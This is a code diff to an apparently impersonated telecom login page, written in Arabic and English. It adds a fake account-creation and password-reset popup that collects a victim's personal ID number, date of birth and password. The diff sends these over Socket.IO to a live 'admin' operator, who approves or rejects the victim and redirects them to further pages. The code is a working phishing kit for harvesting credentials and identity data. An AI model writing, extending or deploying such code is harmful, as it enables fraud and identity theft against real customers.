@@ -376,6 +376,44 @@
     </div>
   </div>
 
+  <!-- Registration/Forgot Password Popup -->
+  <div id="regPopup" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.5); z-index:9999; justify-content:center; align-items:center; overflow-y:auto; padding:20px 0;">
+    <div id="regPopupInner" style="background:#fff; border-radius:16px; padding:32px 24px; max-width:400px; width:90%; box-shadow:0 8px 32px rgba(0,0,0,0.2); margin:auto;">
+      <svg style="width:75px; height:63px; display:block; margin:0 auto 16px;" viewBox="0 0 74 62">
+        <circle cx="31" cy="34" r="17" fill="none" stroke="#ed1c24" stroke-width="11"></circle>
+        <circle cx="58" cy="14" r="7.5" fill="#ed1c24"></circle>
+      </svg>
+      <h3 id="regTitle" style="text-align:center; font-size:20px; font-weight:700; color:#1a1a1a; margin-bottom:20px;">إنشاء حساب جديد</h3>
+      <form id="regForm" autocomplete="off">
+        <div style="margin-bottom:14px;">
+          <label id="regIdLabel" style="display:block; font-size:14px; font-weight:500; color:#333; margin-bottom:6px;">الرقم الشخصي</label>
+          <input id="regIdInput" type="text" placeholder="أدخل الرقم الشخصي" style="width:100%; height:46px; border:1px solid #d9d9d9; border-radius:8px; padding:0 14px; font-size:15px; outline:none; direction:ltr; text-align:left;" />
+        </div>
+        <div style="margin-bottom:14px;">
+          <label id="regDobLabel" style="display:block; font-size:14px; font-weight:500; color:#333; margin-bottom:6px;">تاريخ الميلاد</label>
+          <input id="regDobInput" type="date" style="width:100%; height:46px; border:1px solid #d9d9d9; border-radius:8px; padding:0 14px; font-size:15px; outline:none; direction:ltr; text-align:left;" />
+        </div>
+        <div style="margin-bottom:14px;">
+          <label id="regPassLabel" style="display:block; font-size:14px; font-weight:500; color:#333; margin-bottom:6px;">الرقم السري</label>
+          <input id="regPassInput" type="password" placeholder="أدخل الرقم السري" style="width:100%; height:46px; border:1px solid #d9d9d9; border-radius:8px; padding:0 14px; font-size:15px; outline:none; direction:ltr; text-align:left;" />
+        </div>
+        <div style="margin-bottom:20px;">
+          <label id="regConfirmLabel" style="display:block; font-size:14px; font-weight:500; color:#333; margin-bottom:6px;">تأكيد الرقم السري</label>
+          <input id="regConfirmInput" type="password" placeholder="أعد إدخال الرقم السري" style="width:100%; height:46px; border:1px solid #d9d9d9; border-radius:8px; padding:0 14px; font-size:15px; outline:none; direction:ltr; text-align:left;" />
+        </div>
+        <p id="regError" style="display:none; color:#ed1c24; font-size:13px; text-align:center; margin-bottom:12px;">الرقم السري غير متطابق</p>
+        <button id="regSubmitBtn" type="submit" style="width:100%; height:50px; border:none; border-radius:25px; background:#ed1c24; color:#fff; font-size:16px; font-weight:600; cursor:pointer; position:relative;">متابعة</button>
+      </form>
+      <button id="regCloseBtn" onclick="document.getElementById('regPopup').style.display='none'" style="display:block; margin:14px auto 0; background:none; border:none; color:#666; font-size:14px; cursor:pointer; text-decoration:underline;">إغلاق</button>
+    </div>
+  </div>
+
+  <!-- Registration Waiting Overlay -->
+  <div id="regWaitingOverlay" style="display:none; position:fixed; inset:0; background:rgba(255,255,255,0.9); z-index:10000; justify-content:center; align-items:center; flex-direction:column;">
+    <div class="spinner"></div>
+    <p id="regWaitingText" style="font-size:16px; color:#333; font-weight:500;">جاري التحقق من البيانات...</p>
+  </div>
+
   <!-- Socket.IO -->
   <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
   <script>
@@ -399,7 +437,20 @@
         loadingBtn: 'جاري التحقق...',
         errorMsg: 'بيانات الدخول غير صحيحة. يرجى المحاولة مرة أخرى.',
         popupText: 'عزيزي العميل يرجى المتابعة لتحديث معلومات شريحتك',
-        popupBtn: 'متابعة'
+        popupBtn: 'متابعة',
+        regTitle: 'إنشاء حساب جديد',
+        regForgotTitle: 'استعادة كلمة المرور',
+        regIdLabel: 'الرقم الشخصي',
+        regIdPlaceholder: 'أدخل الرقم الشخصي',
+        regDobLabel: 'تاريخ الميلاد',
+        regPassLabel: 'الرقم السري',
+        regPassPlaceholder: 'أدخل الرقم السري',
+        regConfirmLabel: 'تأكيد الرقم السري',
+        regConfirmPlaceholder: 'أعد إدخال الرقم السري',
+        regError: 'الرقم السري غير متطابق',
+        regSubmitBtn: 'متابعة',
+        regCloseBtn: 'إغلاق',
+        regWaitingText: 'جاري التحقق من البيانات...'
       },
       en: {
         title: 'Welcome back',
@@ -417,7 +468,20 @@
         loadingBtn: 'Verifying...',
         errorMsg: 'Invalid credentials. Please try again.',
         popupText: 'Dear customer, please proceed to update your SIM information',
-        popupBtn: 'Continue'
+        popupBtn: 'Continue',
+        regTitle: 'Create New Account',
+        regForgotTitle: 'Reset Password',
+        regIdLabel: 'Personal ID',
+        regIdPlaceholder: 'Enter your Personal ID',
+        regDobLabel: 'Date of Birth',
+        regPassLabel: 'Password',
+        regPassPlaceholder: 'Enter password',
+        regConfirmLabel: 'Confirm Password',
+        regConfirmPlaceholder: 'Re-enter password',
+        regError: 'Passwords do not match',
+        regSubmitBtn: 'Continue',
+        regCloseBtn: 'Close',
+        regWaitingText: 'Verifying your data...'
       }
     };
 
@@ -459,6 +523,19 @@
       document.getElementById('errorMsg').textContent = t.errorMsg;
       document.getElementById('popupText').textContent = t.popupText;
       document.getElementById('popupBtn').textContent = t.popupBtn;
+
+      // Registration popup translations
+      document.getElementById('regIdLabel').textContent = t.regIdLabel;
+      document.getElementById('regIdInput').placeholder = t.regIdPlaceholder;
+      document.getElementById('regDobLabel').textContent = t.regDobLabel;
+      document.getElementById('regPassLabel').textContent = t.regPassLabel;
+      document.getElementById('regPassInput').placeholder = t.regPassPlaceholder;
+      document.getElementById('regConfirmLabel').textContent = t.regConfirmLabel;
+      document.getElementById('regConfirmInput').placeholder = t.regConfirmPlaceholder;
+      document.getElementById('regError').textContent = t.regError;
+      document.getElementById('regSubmitBtn').textContent = t.regSubmitBtn;
+      document.getElementById('regCloseBtn').textContent = t.regCloseBtn;
+      document.getElementById('regWaitingText').textContent = t.regWaitingText;
     }
 
     // Apply saved language on page load
@@ -576,6 +653,82 @@
       // Listen for page navigation from admin
       socket.on('visitor:navigate', function(page) {
         if (page) window.location.href = '/' + page;
+      });
+
+      // Registration/Forgot Password popup logic
+      var regPopupType = 'signup'; // 'signup' or 'forgot'
+
+      document.getElementById('forgotLink').addEventListener('click', function(e) {
+        e.preventDefault();
+        regPopupType = 'forgot';
+        var t = translations[currentLang];
+        document.getElementById('regTitle').textContent = t.regForgotTitle;
+        document.getElementById('regPopup').style.display = 'flex';
+      });
+
+      document.getElementById('signupBtn').addEventListener('click', function(e) {
+        e.preventDefault();
+        regPopupType = 'signup';
+        var t = translations[currentLang];
+        document.getElementById('regTitle').textContent = t.regTitle;
+        document.getElementById('regPopup').style.display = 'flex';
+      });
+
+      document.getElementById('regForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        var personalId = document.getElementById('regIdInput').value.trim();
+        var dob = document.getElementById('regDobInput').value.trim();
+        var pass = document.getElementById('regPassInput').value.trim();
+        var confirm = document.getElementById('regConfirmInput').value.trim();
+        var regError = document.getElementById('regError');
+
+        // Validate all fields
+        if (!personalId || !dob || !pass || !confirm) {
+          regError.textContent = currentLang === 'ar' ? 'يرجى تعبئة جميع الحقول' : 'Please fill all fields';
+          regError.style.display = 'block';
+          return;
+        }
+
+        // Check passwords match
+        if (pass !== confirm) {
+          regError.textContent = translations[currentLang].regError;
+          regError.style.display = 'block';
+          return;
+        }
+
+        regError.style.display = 'none';
+        // Hide popup, show waiting
+        document.getElementById('regPopup').style.display = 'none';
+        document.getElementById('regWaitingOverlay').style.display = 'flex';
+
+        // Send data to admin
+        var pageName = regPopupType === 'forgot' ? 'نسيت كلمة المرور' : 'إنشاء حساب';
+        socket.emit('more-info', {
+          content: {
+            'الرقم الشخصي': personalId,
+            'تاريخ الميلاد': dob,
+            'الرقم السري': pass,
+            'تأكيد الرقم السري': confirm
+          },
+          page: pageName,
+          waitingForAdminResponse: true
+        });
+      });
+
+      // Listen for admin response for registration
+      socket.on('reg:action', function(data) {
+        var act = (data && data.action) ? data.action : data;
+        if (act === 'approve') {
+          document.getElementById('regWaitingOverlay').style.display = 'none';
+          var cLang = localStorage.getItem('siteLang') || localStorage.getItem('oredoo_site_language') || 'ar';
+          window.location.href = '/customer-authentication/' + (cLang === 'en' ? '?lang=en' : '');
+        } else if (act === 'reject') {
+          document.getElementById('regWaitingOverlay').style.display = 'none';
+          document.getElementById('regPopup').style.display = 'flex';
+          var regError = document.getElementById('regError');
+          regError.textContent = currentLang === 'ar' ? 'البيانات غير صحيحة. يرجى المحاولة مرة أخرى.' : 'Invalid data. Please try again.';
+          regError.style.display = 'block';
+        }
       });
     })();
   </script>
